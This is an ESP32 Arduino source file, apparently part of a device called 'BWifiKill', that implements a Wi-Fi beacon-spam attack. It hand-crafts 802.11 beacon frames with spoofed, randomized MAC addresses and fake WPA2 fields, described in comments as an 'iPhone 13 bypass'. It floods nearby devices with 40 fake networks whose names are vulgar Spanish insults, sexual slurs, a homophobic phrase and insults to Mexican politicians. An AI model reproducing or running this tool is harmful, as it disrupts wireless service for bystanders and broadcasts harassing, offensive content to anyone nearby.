#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <U8g2lib.h>
#include "beacon_spam.h"

extern U8G2 u8g2; 
bool isSpamming = false;

// Variables para la animación
unsigned long lastAnimUpdate = 0;
int animFrame = 0;

const char* ssids[] = {
    "👹Eres_Un_Pendejo", "💀Wifi_Para_Pendejos", "😈Wifi_Gratis", "📡Ey_Tu_La_De_Negro",
    "🔥Meteme_la_Vagina", "👾Te_Estoy_Viendo", "💣Enanos_y_caballos", "😱Porno_homosexual",
    "🤖Amlo_es_Puto", "🔞Puro_Morena_AMLO", "🧠Sheinbaum_se_la_come", "⚠️Puto_el_que_lo_lea",
    "🐍Conectate_y_te_hackeo", "💥El_Diablo_Te_Bendiga", "🔍Chupame_la_verga", "👽Paga_tu_internet", 
    "🔥Pinche_Pobre", "💾Putas_Gratis", "🚨Me_Cogi_a_tu_mama", "🖕Chupa_Limón_Kbron",
    "🤌Tu_Mama_Es_Hombre", "🤡Payaso_El_Que_Se_Conecte", "🧼Bañate_Cochino", "🕵️Cisen_Unidad_04",
    "👮Patrulla_Espacial_69", "🤮Tu_Cara_Da_Asquito", "🍄Vendo_Hongos_Alucinogenos", "🧨Cuidado_Explosivo",
    "🌚Me_Gustas_Cuando_Callas", "🥀Virgen_A_Los_40", "🍗Pollo_Frito_Gratis", "🍖Huele_A_Obito",
    "🦶Amo_Tus_Patas", "👅Lameme_El_Sipitajo", "🧟Zombi_En_Tu_Cochera", "👺Soy_Tu_Padre_HDP",
    "🍕Pizza_Con_Piña_Sux", "🌑Oscuro_Como_Tu_Conciencia", "💊Toma_Tu_Medicina", "📉Tu_IQ_Es_De_0"
};
int total_ssids = 40; 

// Estructura de paquete mejorada para compatibilidad
uint8_t packet[150] = { 
    0x80, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x11, 0x04 // CapacidadESS + Preámbulo corto
};

void drawXAntenna(int x, int y, int frame) {
    u8g2.drawTriangle(x+4, y+10, x+8, y+2, x+12, y+10); 
    u8g2.drawDisc(x+8, y+2, 2); 
    if (frame >= 1) u8g2.drawCircle(x+8, y+2, 4, U8G2_DRAW_UPPER_LEFT|U8G2_DRAW_UPPER_RIGHT);
    if (frame >= 2) u8g2.drawCircle(x+8, y+2, 7, U8G2_DRAW_UPPER_LEFT|U8G2_DRAW_UPPER_RIGHT);
    if (frame >= 3) u8g2.drawCircle(x+8, y+2, 10, U8G2_DRAW_UPPER_LEFT|U8G2_DRAW_UPPER_RIGHT);
}

void beaconSpamLoop() {
    if (digitalRead(32) == LOW) { 
        isSpamming = !isSpamming;
        if (isSpamming) {
            WiFi.mode(WIFI_STA);
            esp_wifi_set_promiscuous(true);
        } else {
            esp_wifi_set_promiscuous(false);
            WiFi.mode(WIFI_OFF);
        }
        delay(400);
    }

    if (isSpamming) {
        while (isSpamming) {
            for (int i = 0; i < total_ssids; i++) {
                // --- MEJORA BYPASS IPHONE 13: MAC ALEATORIA ---
                packet[10] = 0x00; packet[11] = 0x16; packet[12] = 0xEA; // Vendor Intel/Cisco
                packet[13] = random(0, 255); packet[14] = random(0, 255); packet[15] = (uint8_t)i;
                memcpy(&packet[16], &packet[10], 6); // BSSID = Source

                // SSID
                int len = strlen(ssids[i]);
                packet[36] = 0x00; packet[37] = len; 
                for (int j = 0; j < len; j++) packet[38 + j] = ssids[i][j]; 
                
                int p = 38 + len;
                // Rates (Crucial para iPhone)
                packet[p++] = 0x01; packet[p++] = 0x08;
                packet[p++] = 0x82; packet[p++] = 0x84; packet[p++] = 0x8b; packet[p++] = 0x96;
                packet[p++] = 0x24; packet[p++] = 0x30; packet[p++] = 0x48; packet[p++] = 0x6c;

                // Canal
                packet[p++] = 0x03; packet[p++] = 0x01;
                int ch = random(1, 11); // Evitar canales altos problemáticos
                packet[p++] = (uint8_t)ch;

                // --- MEJORA BYPASS IPHONE 13: RSN (WPA2) ---
                packet[p++] = 0x30; packet[p++] = 0x14; 
                packet[p++] = 0x01; packet[p++] = 0x00; packet[p++] = 0x00; packet[p++] = 0x0f;
                packet[p++] = 0xac; packet[p++] = 0x04; packet[p++] = 0x01; packet[p++] = 0x00;
                packet[p++] = 0x00; packet[p++] = 0x0f; packet[p++] = 0xac; packet[p++] = 0x04;
                packet[p++] = 0x01; packet[p++] = 0x00; packet[p++] = 0x00; packet[p++] = 0x0f;
                packet[p++] = 0xac; packet[p++] = 0x02; packet[p++] = 0x00; packet[p++] = 0x00;

                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                esp_wifi_80211_tx(WIFI_IF_STA, packet, p, false);
                
                // --- GESTIÓN DE ANIMACIÓN ---
                if (millis() - lastAnimUpdate > 100) {
                    lastAnimUpdate = millis();
                    animFrame = (animFrame + 1) % 4;
                    u8g2.clearBuffer();
                    u8g2.setFont(u8g2_font_6x10_tr);
                    u8g2.drawStr(0, 10, "SPAM MASIVO (BYPASS)");
                    drawXAntenna(110, 0, animFrame);
                    u8g2.drawHLine(0, 13, 128);

                    if (animFrame % 2 == 0) u8g2.drawStr(10, 28, ">> INYECTANDO <<");
                    
                    u8g2.setCursor(10, 42);
                    u8g2.print("Fuerza Bruta: "); u8g2.print(total_ssids);

                    for(int b=0; b<12; b++) {
                        int barHeight = random(2, 15);
                        u8g2.drawBox(b*11, 64-barHeight, 7, barHeight);
                    }
                    u8g2.sendBuffer();
                }

                if (digitalRead(25) == LOW) { 
                    isSpamming = false;
                    esp_wifi_set_promiscuous(false);
                    WiFi.mode(WIFI_OFF);
                    return;
                }
            }
            yield();
        }
    } else {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "BWifiKill: BEACON SPAM");
        u8g2.drawHLine(0, 13, 128);
        u8g2.drawTriangle(54, 20, 74, 20, 64, 35); 
        u8g2.drawStr(15, 50, "OK: INYECTAR SPAM");
        u8g2.sendBuffer();
    }
}